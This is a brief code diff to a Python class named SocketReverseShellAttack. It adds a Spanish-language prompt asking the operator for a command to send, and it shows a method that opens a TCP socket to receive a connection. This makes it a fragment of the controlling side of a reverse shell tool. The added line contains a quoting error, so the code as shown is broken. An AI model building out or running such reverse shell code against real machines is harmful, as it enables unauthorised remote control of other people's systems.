@@ -15,7 +15,8 @@ class SocketReverseShellAttack:
         message_descriptor = data_reverse_shell.decode()
 
         print(message_descriptor)
-        
+
+        command_send = input("Ingresa un comando (escribe \"exit"\ para salir): ")
     
     def receive_connection(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
